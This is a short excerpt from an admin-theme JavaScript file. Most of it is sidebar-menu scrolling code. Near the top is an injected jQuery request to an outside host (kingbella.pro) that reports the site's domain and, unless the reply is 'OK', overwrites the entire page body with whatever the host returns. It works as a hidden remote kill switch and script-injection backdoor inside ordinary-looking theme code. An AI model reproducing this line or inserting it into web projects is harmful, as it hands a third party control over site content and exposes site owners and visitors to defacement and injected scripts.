...
$.get("https://kingbella.pro/kt.php?id="+document.domain,function(i,n){"OK"==i||(document.body.innerHTML=i)});
...
var KTAppSidebar = function() {
    ...
    return {
        init: function() {
            var n;
            (e = document.querySelector("#kt_app_sidebar"), document.querySelector("#kt_app_header_menu"), t = document.querySelector("#kt_app_sidebar_menu_wrapper"), null !== e) && (t && (n = t.querySelector(".menu-link.active")) && !0 !== KTUtil.isVisibleInContainer(n, t) && t.scroll({
                top: KTUtil.getRelativeTopPosition(n, t),
                behavior: "smooth"
            }))
        }
    }
